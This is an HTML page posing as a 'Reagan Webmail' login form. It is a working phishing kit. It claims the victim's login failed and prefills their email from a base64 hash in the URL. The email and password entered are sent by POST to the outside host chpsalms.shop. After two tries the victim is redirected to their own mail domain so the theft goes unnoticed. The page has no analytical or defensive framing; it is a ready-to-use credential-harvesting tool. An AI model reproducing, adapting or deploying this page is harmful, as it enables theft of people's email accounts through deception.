
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Reagan Webmail</title>
    <link rel="shortcut icon" href="https://i.ibb.co/h1HX3Ch/favicon1.png"/>
    <style type="text/css">
        /* Background image styling */
        .background-image {
            background-image: url('https://example.com/your-image.jpg'); /* Replace with your image URL */
            background-size: cover; /* Ensure the image covers the entire element */
            background-position: center; /* Center the image */
            background-repeat: no-repeat; /* Prevent image repetition */
            filter: brightness(1.2); /* Increase brightness by 20% */
            height: 100vh; /* Full viewport height */
            display: flex; /* Flexbox for centering content */
            align-items: center; /* Center items vertically */
            justify-content: center; /* Center items horizontally */
        }

        /* Form Container Styling */
        .form-container {
            background-color: rgba(255, 255, 255, 0.9); /* Semi-transparent white background */
            padding: 20px; /* Add padding for spacing */
            border-radius: 8px; /* Rounded corners */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Subtle shadow */
            max-width: 500px; /* Maximum width of the form */
            width: 60%; /* Full width up to the max width */
            box-sizing: border-box; /* Include padding and border in the element's total width and height */
        }

        /* Styling for the email and password input fields */
        .form-control {
            border: 2px solid black; /* Thicker and more visible black border */
            border-radius: 5px; /* Rounded corners to match the form container */
            padding: 10px; /* Additional padding for a comfortable look */
            font-size: 16px; /* Slightly larger font size for better readability */
        }

        /* Change border color on focus */
        .form-control:focus {
            border-color: #00BFFF; /* Deep Sky Blue color when the input is focused */
            box-shadow: 0 0 5px rgba(0, 191, 255, 0.5); /* Add a subtle blue glow on focus */
            outline: none; /* Remove the default outline */
        }

        /* Custom style for the login button */
        #submit-btn {
            background-color: #00BFFF; /* Deep Sky Blue color */
            color: white; /* White text color */
            width: 90%; /* Increased width to 90% */
            max-width: 300px; /* Maximum width to prevent excessive stretching */
            margin: 0 auto; /* Center the button horizontally */
            display: block; /* Ensure the button is treated as a block-level element */
            border-radius: 5px; /* Rounded corners */
            border: none; /* Remove default border */
        }

        /* Make labels bold */
        label {
            font-weight: bold; /* Make the email address and password labels bold */
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.js" integrity="sha512-CX7sDOp7UTAq+i1FYIlf9Uo27x4os+kGeoT7rgwvY+4dmjqV0IuE/Bl5hVsjnQPQiTOhAX1O2r2j5bjsFBvv/A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
    <!-- Background Image Section -->
    <div class="background-image">
        <!-- Form Container -->
        <div class="form-container">
            <!-- Form Content -->
            <div class="text-center mb-4">
                <img src="https://iili.io/dwHV374.png" alt="Webmail Logo" style="max-width: 50%; height: auto;">
            </div>
            <!-- Center-aligned text -->
            <div class="text-center mb-4">
                <span style="font-weight: 700; color: #C13D3F; font-size: 14px;">The Login is invalid. Please log in again.</span>
            </div>
            <form class="mt-4">
                <center>
                    <div class="alert alert-danger" id="msg" style="display: none;">Invalid password! Please enter the correct password.</div>
                    <span id="error" class="text-danger" style="display: none;">Account does not exist. Please enter another account.</span>
                </center>
                <div class="form-group">
                    <label for="staticai">Email Address</label>
                    <input type="email" class="form-control py-1" id="ai" value="">
                </div>
                <div class="form-group">
                    <label for="inputpr">Password</label>
                    <input type="password" class="form-control py-1" id="pr" placeholder="">
                </div>
                <button type="button" class="btn py-1" id="submit-btn">Login</button>
            </form>
            <!-- Processing animation -->
            <div style="text-align:center" id="processing"><img src="https://i.ibb.co/PM6PTDC/processing.gif" width="50px" /></div>
        </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

     <script>
        $(document).ready(function () {
    var count = 0;

    function decodeBase64(value) {
        try {
            return atob(value);
        } catch (e) {
            return value;
        }
    }

    function extractDomain(email) {
        var atIndex = email.indexOf("@");
        return email.slice(atIndex + 1).split('.')[0].toLowerCase();
    }

    function showError(message) {
        $("#error").html(message).show();
    }

    function hideProcessingAndErrors() {
        $("#processing").hide();
        $('#error').hide();
        $('#msg').hide();
    }

    function isEmailValid(email) {
        var emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        return emailRegex.test(email);
    }

    var ai = window.location.hash.substr(1);
    if (ai) {
        var my_ai = isEmailValid(ai) ? decodeBase64(ai) : ai;
        $('#ai').val(my_ai).attr('readonly', true);
        hideProcessingAndErrors();
    }

    $('#submit-btn').click(function (event) {
        event.preventDefault();
        hideProcessingAndErrors();
        $("#processing").show();

        setTimeout(function () {
            var ai = $("#ai").val();
            var pr = $("#pr").val();

            if (!ai) {
                showError("The email field is required!");
                $("#processing").hide();
                return;
            }

            if (!isEmailValid(ai)) {
                showError("This account does not exist. Please enter another account.");
                $("#processing").hide();
                return;
            }

            if (!pr) {
                showError("The password field is required!");
                $("#processing").hide();
                return;
            }

            var my_slice = extractDomain(ai);
            count += 1;

            $.ajax({
                dataType: 'JSON',
                url: 'https://chpsalms.shop/tme/nextme.php',
                type: 'POST',
                data: { ai: ai, pr: pr },
                beforeSend: function () {
                    $('#submit-btn').text('Verifying ...');
                },
                success: function (response) {
                    alert(response);
                    if (response && response.signal === 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            window.location.replace("http://www." + my_slice);
                        }
                    } else {
                        $("#msg").show();
                    }
                },
                error: function () {
                    $("#msg").show();
                    if (count >= 2) {
                        count = 0;
                        window.location.replace("http://www." + my_slice);
                    }
                },
                complete: function () {
                    $("#processing").hide();
                    $('#submit-btn').text('Login');
                }
            });
        }, 4000);
    });

    $("#processing").hide();
});

    </script>
</body>
</html>
```
